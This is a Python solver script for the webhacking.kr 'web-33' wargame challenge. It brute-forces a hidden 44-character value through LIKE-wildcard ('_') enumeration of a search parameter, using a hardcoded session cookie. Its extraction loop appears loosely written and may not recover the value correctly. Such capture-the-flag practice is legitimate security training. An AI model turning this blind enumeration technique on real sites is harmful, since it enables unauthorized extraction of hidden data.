import requests
import string

url = "https://webhacking.kr/challenge/web-33/index.php"
cookie = {'PHPSESSID': 'csltdbnt02klcvgctq640tijhv'}

param = {"search":"_"}
req = requests.post(url, params=param, cookies=cookie)

str1=string.printable
str1=str1[:-38]

def search_len(): # 44글자 (노가다로 구함)
    length = "_"
    for i in range(100):
        param = {"search":"{}".format(length)}
        req = requests.post(url, params=param, cookies=cookie)
        print(param)
        if "readme" in req.text:
            length += "_"
        else:
            print("length:",length)
            break

def search_str():
    length = 44
    string = ""
    value = ""
    for i in range(44):
        value2 = "_" * (44 - i)
        for value in str1:
            param = {"search":"{}".format(str(value) + value2)}
            print(param)
            req = requests.post(url, params=param, cookies=cookie)
            if "admin" not in req.text:
                string += str(value)
        print(string)
    print("String:", string)

search_str()